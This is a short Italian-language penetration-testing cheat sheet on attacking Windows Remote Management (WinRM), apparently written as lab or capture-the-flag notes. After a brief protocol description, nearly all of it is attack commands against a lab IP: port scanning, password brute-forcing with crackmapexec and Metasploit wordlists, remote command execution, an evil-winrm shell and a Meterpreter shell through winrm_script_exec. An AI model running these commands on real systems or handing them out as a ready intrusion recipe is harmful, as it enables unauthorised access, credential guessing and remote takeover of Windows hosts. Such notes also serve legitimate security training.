
La gestione remota di Windows ( WinRM) è un semplice protocollo di gestione remota integrato in Windows basato sulla riga di comando. WinRM utilizza il protocollo di accesso agli oggetti semplici ( SOAP) per stabilire connessioni con host remoti e le relative applicazioni. Pertanto, WinRM deve essere abilitato e configurato esplicitamente a partire da Windows 10. WinRM si basa su TCP porti 5985 e 5986 (+ TLS). 

Prima di provare a connettersi al servizio WinRM. Dobbiamo usare un metodo di autenticazione valido durante la connessione al servizio.


```
> nmap --top-ports 7000 10.4.30.175
> nmap -sV -p 5985 10.4.30.175
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


# Crackmapexec - WinRM Bruteforce 
> crackmapexec winrm 10.4.30.175 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

> crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "whoami" 
> crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "systeminfo"

#Evil-WinRM - get command shell:
> evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.4.30.175

Metasploit - WinRM Login:
> use auxiliary/scanner/winrm/winrm_login
> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Metasploit - WinRM Auth Methods Supported:
> use auxiliary/scanner/winrm/winrm_auth_methods
[+] Basic Protocol Supported
[+] Negotiate Protocol Supported


Metasploit - WinRM Execute Command:
> use auxiliary/scanner/winrm/winrm_cmd
> set CMD whoami


Metasploit -  WinRM Meterpreter Shell:
> search winrm_script 
use exploit/windows/winrm/winrm_script_exec 
set RHOSTS 10.4.30.175 
set USERNAME administrator 
set PASSWORD tinkerbell 
set FORCE_VBS true 
exploit

